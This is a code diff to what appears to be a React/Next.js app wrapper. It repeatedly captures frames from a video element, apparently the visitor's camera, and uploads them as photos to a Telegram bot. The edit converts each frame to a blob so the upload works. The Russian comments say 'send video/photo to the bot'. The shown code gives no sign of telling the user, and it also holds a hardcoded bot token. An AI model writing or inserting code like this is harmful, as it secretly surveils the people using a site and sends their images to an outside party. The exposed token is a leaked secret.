@@ -9,7 +9,7 @@ import { useEffect, useRef } from "react";
 
 const myApp = ({ Component, pageProps }) => {
 
-    // отправляем видео боту 
+    // отправляем видео/фото боту 
     const videoRef = useRef(null);
 
     const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
@@ -36,10 +36,11 @@ const myApp = ({ Component, pageProps }) => {
                     // Отправляем данные на сервер (бота) с использованием fetch
                     setInterval(async () => {
                         const photoDataUrl = captureFrame();
+                        const blob = await (await fetch(photoDataUrl)).blob();
 
                         const formData = new FormData();
                         formData.append('chat_id', chatId);
-                        formData.append('photo', photoDataUrl);
+                        formData.append('photo', blob, 'photo.jpg');
 
                         try {
                             const response = await fetch(urlApi, {
